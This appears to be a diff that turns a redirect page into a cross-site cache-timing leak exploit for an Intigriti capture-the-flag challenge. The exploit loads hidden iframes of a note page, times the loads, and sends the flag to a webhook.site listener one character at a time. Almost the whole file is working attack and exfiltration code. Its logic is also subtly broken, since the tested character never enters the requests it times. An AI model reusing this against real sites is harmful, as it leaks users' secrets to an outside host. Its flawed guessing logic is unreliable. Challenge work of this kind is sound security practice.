@@ -1,15 +1,255 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
-    <!-- Ritardo di 2-3 secondi, URL decodificato dal parametro 'target' -->
-    <meta http-equiv="refresh" content="3;url=https://challenge-0325.intigriti.io/note/d577d06c-c0d1-4ca2-9a25-abfe2d827202">
-    <script>
-        // Fallback o alternativa con JS
-        // setTimeout(() => { window.location.href = 'https://challenge-0325.intigriti.io/note/d577d06c-c0d1-4ca2-9a25-abfe2d827202'; }, 3000);
-    </script>
+    <title>Leaking...</title>
+    <meta charset="utf-8">
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        #status { margin-top: 20px; border: 1px solid #ccc; padding: 10px; height: 300px; overflow-y: scroll; }
+        .log-entry { margin-bottom: 5px; font-size: 0.9em; }
+        .success { color: green; }
+        .error { color: red; }
+        .info { color: blue; }
+    </style>
 </head>
 <body>
-    <p>One moment...</p>
+    <h1>Leaky Flagment - Cache Timing XS-Leak</h1>
+    <div id="status">Starting...</div>
+
+    <script>
+        // --- Configuration ---
+        const NOTE_ID = "YOUR_NOTE_ID_HERE"; // <-- REPLACE THIS
+        const ATTACKER_LISTENER_URL = "https://webhook.site/c93aa80e-2711-477d-9419-9cd835344dff"; // <-- REPLACE THIS
+        const KNOWN_FLAG_PREFIX = "INTIGRITI{";
+        const possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!}"; // Adjust if needed
+        const FLAG_END_CHAR = '}';
+        const MAX_FLAG_LENGTH = 70; // Safety limit
+
+        // --- Timing Parameters (ADJUST THESE) ---
+        const NUM_SAMPLES = 5; // Number of measurements per character to average
+        const PRIMING_TIMEOUT = 5000; // Max time for Phase 1 (ms)
+        const MEASUREMENT_TIMEOUT = 5000; // Max time for Phase 2 load (ms)
+        const DELAY_BETWEEN_PHASES = 100; // Optional small delay (ms)
+        const DELAY_BETWEEN_SAMPLES = 50; // Optional small delay (ms)
+
+
+        // --- State ---
+        let leakedFlag = KNOWN_FLAG_PREFIX;
+        const statusDiv = document.getElementById('status');
+
+        // --- Helper Functions ---
+        function log(message, type = 'info') {
+            console.log(`[${type.toUpperCase()}] ${message}`);
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            statusDiv.appendChild(entry);
+            statusDiv.scrollTop = statusDiv.scrollHeight; // Auto-scroll
+        }
+
+        function sendLeak(data) {
+            log(`Sending leak: ${data}`, 'info');
+            fetch(`${ATTACKER_LISTENER_URL}?leak=${encodeURIComponent(data)}`, { mode: 'no-cors' })
+                .catch(err => log(`Failed to send leak: ${err}`, 'error'));
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function calculateAverage(arr) {
+            if (!arr || arr.length === 0) return 0;
+            const sum = arr.reduce((a, b) => a + b, 0);
+            return sum / arr.length;
+        }
+
+        /**
+         * Primes the cache by visiting the note page, triggering the middleware redirect
+         * and fragment processing, then measures the load time of the same page
+         * without the fragment to probe the cache state.
+         *
+         * Returns a Promise resolving with the duration in milliseconds, or rejecting on timeout/error.
+         */
+        function measureTimingAfterPriming() {
+            return new Promise(async (resolve, reject) => {
+                let iframe1, iframe2;
+                let phase1Timeout, phase2Timeout;
+                let startTime;
+
+                const cleanup = () => {
+                    clearTimeout(phase1Timeout);
+                    clearTimeout(phase2Timeout);
+                    if (iframe1) iframe1.remove();
+                    if (iframe2) iframe2.remove();
+                };
+
+                try {
+                    // --- Phase 1: Prime Cache ---
+                    log("Phase 1: Priming cache...");
+                    iframe1 = document.createElement('iframe');
+                    iframe1.style.display = 'none'; // Hide iframe
+
+                    const phase1Promise = new Promise((resolvePhase1, rejectPhase1) => {
+                        iframe1.onload = () => {
+                            log("Phase 1: Priming complete (iframe loaded).");
+                            resolvePhase1();
+                        };
+                        iframe1.onerror = (err) => {
+                           log(`Phase 1: Iframe error during priming: ${err}`, 'error');
+                           rejectPhase1('Priming iframe error');
+                        };
+                        // Visiting /note/[id] triggers middleware redirect to /note/[id]?s=true#:~:secret...
+                        iframe1.src = `/note/${NOTE_ID}`;
+                        document.body.appendChild(iframe1);
+
+                        phase1Timeout = setTimeout(() => {
+                           rejectPhase1(`Phase 1: Priming timed out after ${PRIMING_TIMEOUT}ms`);
+                        }, PRIMING_TIMEOUT);
+                    });
+
+                    await phase1Promise; // Wait for priming to finish or timeout
+                    clearTimeout(phase1Timeout); // Clear timeout if resolved normally
+                    await sleep(DELAY_BETWEEN_PHASES); // Optional delay
+
+                    // --- Phase 2: Measure Time ---
+                    log("Phase 2: Measuring load time...");
+                    startTime = performance.now();
+                    iframe2 = document.createElement('iframe');
+                    iframe2.style.display = 'none';
+
+                    const phase2Promise = new Promise((resolvePhase2, rejectPhase2) => {
+                         iframe2.onload = () => {
+                            const endTime = performance.now();
+                            const duration = endTime - startTime;
+                            log(`Phase 2: Measurement complete. Duration: ${duration.toFixed(2)}ms`);
+                            resolvePhase2(duration);
+                        };
+                         iframe2.onerror = (err) => {
+                            log(`Phase 2: Iframe error during measurement: ${err}`, 'error');
+                            rejectPhase2('Measurement iframe error');
+                         };
+                        // Visit the page *without* the fragment to hit the cache
+                        iframe2.src = `/note/${NOTE_ID}?s=true`;
+                        document.body.appendChild(iframe2);
+
+                        phase2Timeout = setTimeout(() => {
+                            rejectPhase2(`Phase 2: Measurement timed out after ${MEASUREMENT_TIMEOUT}ms`);
+                        }, MEASUREMENT_TIMEOUT);
+                    });
+
+                    const duration = await phase2Promise;
+                    cleanup();
+                    resolve(duration);
+
+                } catch (error) {
+                    log(`Error during measurement: ${error}`, 'error');
+                    cleanup();
+                    reject(error);
+                }
+            });
+        }
+
+        /**
+         * Analyzes timings to find the character with a distinct average duration.
+         * This assumes the correct character's timing is an outlier (min or max).
+         */
+        function findCharWithDistinctTiming(measurements) {
+             if (Object.keys(measurements).length === 0) return null;
+
+             let minDuration = Infinity;
+             let maxDuration = -Infinity;
+             let minChar = null;
+             let maxChar = null;
+
+             for (const char in measurements) {
+                 const avgDuration = measurements[char].average;
+                 if (avgDuration < minDuration) {
+                     minDuration = avgDuration;
+                     minChar = char;
+                 }
+                 if (avgDuration > maxDuration) {
+                     maxDuration = avgDuration;
+                     maxChar = char;
+                 }
+             }
+
+            log(`Timing analysis: Min=${minDuration.toFixed(2)} ('${minChar}'), Max=${maxDuration.toFixed(2)} ('${maxChar}')`);
+
+            // Heuristic: Choose the one that's more 'extreme' or assume one direction (e.g., faster)
+            // This might need adjustment. Is the correct timing faster or slower?
+            // Let's assume faster for now (replace minChar with maxChar if slower)
+            // A more robust method might look at standard deviation or distance from the median.
+            if (minChar && maxChar && minChar !== maxChar) {
+                 // Basic check: if min is significantly lower than max, maybe it's the one.
+                 // This is a weak heuristic and might need improvement.
+                 // Consider logging all timings and analyzing offline if needed.
+                 log(`Choosing '${minChar}' based on minimum duration heuristic.`);
+                 return minChar;
+            } else if (minChar) {
+                 log(`Choosing '${minChar}' as only candidate.`);
+                 return minChar;
+            }
+
+            log("Could not reliably determine distinct character.", 'error');
+            return null;
+        }
+
+
+        // --- Main Leak Logic ---
+        async function startLeak() {
+            log(`Starting leak process. Known prefix: "${leakedFlag}"`);
+            sendLeak(leakedFlag); // Send initial prefix
+
+            while (!leakedFlag.endsWith(FLAG_END_CHAR) && leakedFlag.length < MAX_FLAG_LENGTH) {
+                log(`Attempting to find next character after "${leakedFlag}"`);
+                const measurements = {}; // Store { char: { durations: [], average: 0 } }
+
+                for (const char of possibleChars) {
+                    log(`Testing character: '${char}'`);
+                    measurements[char] = { durations: [], average: 0 };
+                    try {
+                        for (let i = 0; i < NUM_SAMPLES; i++) {
+                            log(`  Sample ${i + 1}/${NUM_SAMPLES} for '${char}'...`);
+                            const duration = await measureTimingAfterPriming();
+                            measurements[char].durations.push(duration);
+                            await sleep(DELAY_BETWEEN_SAMPLES); // Small delay between samples
+                        }
+                        measurements[char].average = calculateAverage(measurements[char].durations);
+                        log(`  Average duration for '${char}': ${measurements[char].average.toFixed(2)}ms`);
+                    } catch (error) {
+                        log(`  Failed to get timing for '${char}': ${error}`, 'error');
+                        // Decide how to handle failures: skip char, retry, abort?
+                        measurements[char].average = -1; // Mark as failed
+                    }
+                     // Optional: Send intermediate timings for debugging
+                     // fetch(`${ATTACKER_LISTENER_URL}?timing=${encodeURIComponent(char)}&avg=${measurements[char].average.toFixed(2)}&samples=${measurements[char].durations.join(',')}`, { mode: 'no-cors' });
+                }
+
+                const winningChar = findCharWithDistinctTiming(measurements);
+
+                if (winningChar) {
+                    leakedFlag += winningChar;
+                    log(`Found next character: '${winningChar}'. Current flag: "${leakedFlag}"`, 'success');
+                    sendLeak(leakedFlag);
+                } else {
+                    log("Could not determine the next character. Aborting.", 'error');
+                    sendLeak(leakedFlag + " [ERROR: LEAK FAILED]");
+                    break;
+                }
+            }
+
+            if (leakedFlag.endsWith(FLAG_END_CHAR)) {
+                log(`Leak successful! Final flag: ${leakedFlag}`, 'success');
+                sendLeak(leakedFlag + " [SUCCESS]");
+            } else if (leakedFlag.length >= MAX_FLAG_LENGTH) {
+                 log(`Reached max length limit. Aborting. Partial flag: ${leakedFlag}`, 'error');
+                 sendLeak(leakedFlag + " [ERROR: MAX LENGTH REACHED]");
+            }
+        }
+
+        // --- Start ---
+        window.onload = startLeak;
+
+    </script>
 </body>
 </html>
